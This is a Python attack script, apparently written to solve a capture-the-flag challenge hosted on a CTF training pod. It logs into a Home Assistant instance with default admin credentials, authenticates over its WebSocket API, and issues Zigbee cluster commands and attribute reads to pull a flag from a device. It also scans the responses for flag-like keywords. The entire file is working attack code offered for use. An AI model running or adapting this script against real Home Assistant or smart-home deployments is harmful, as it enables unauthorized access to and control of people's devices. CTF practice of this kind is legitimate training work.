#!/usr/bin/env python3
import asyncio
import websockets
import json
import requests

async def persistent_websocket():
    # Get fresh token
    login_resp = requests.post("http://training-pod2.ctfchile.com:32780/api/v2/auth/login",
                               json={"username": "admin", "password": "admin1234"})
    token = login_resp.json()["access_token"]

    uri = "ws://training-pod2.ctfchile.com:32780/api/websocket"

    try:
        async with websockets.connect(uri) as websocket:
            # Auth handshake
            auth_req = await websocket.recv()
            print(f"[*] Auth request: {auth_req}")

            await websocket.send(json.dumps({"type": "auth", "access_token": token}))

            auth_resp = await websocket.recv()
            print(f"[*] Auth response: {auth_resp}")

            if "auth_ok" not in auth_resp:
                print("[-] Auth failed")
                return

            # Subscribe to events
            await websocket.send(json.dumps({"type": "subscribe_events"}))
            print("[+] Subscribed to all events")

            # Subscribe to state changes
            await websocket.send(json.dumps({
                "type": "subscribe_events",
                "event_type": "state_changed"
            }))

            # Send commands directly through WebSocket (Home Assistant supports this)
            command_types = [
                {"type": "call_service", "domain": "zha", "service": "issue_zigbee_cluster_command",
                 "service_data": {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "command": "get_flag"}},

                {"type": "call_service", "domain": "zha", "service": "get_zigbee_cluster_attribute",
                 "service_data": {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "attribute": "flag"}},

                {"type": "call_service", "domain": "zha", "service": "read_zigbee_cluster_attribute",
                 "service_data": {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "attribute_id": 1}},
            ]

            for i, cmd in enumerate(command_types):
                print(f"\n[*] Sending command {i+1} via WebSocket...")
                await websocket.send(json.dumps(cmd))

                # Wait for response
                try:
                    for _ in range(3):  # Check for responses
                        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                        response_data = json.loads(response)

                        print(f"    Response: {json.dumps(response_data, indent=4)}")

                        # Look for flag patterns
                        if any(keyword in str(response_data).lower() for keyword in ['flag', 'ctf', 'shadow']):
                            print(f"[!] POTENTIAL FLAG FOUND: {response_data}")

                except asyncio.TimeoutError:
                    print(f"    No response within timeout for command {i+1}")

                await asyncio.sleep(1)

            # Keep listening for additional events
            print("\n[*] Listening for additional events for 30 seconds...")
            try:
                for _ in range(30):
                    message = await asyncio.wait_for(websocket.recv(), timeout=1.0)
                    msg_data = json.loads(message)

                    if any(keyword in str(msg_data).lower() for keyword in ['flag', 'ctf', 'shadow', 'coordinator']):
                        print(f"[!] INTERESTING EVENT: {json.dumps(msg_data, indent=2)}")

            except asyncio.TimeoutError:
                pass

            print("\n[*] WebSocket session complete")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    asyncio.run(persistent_websocket())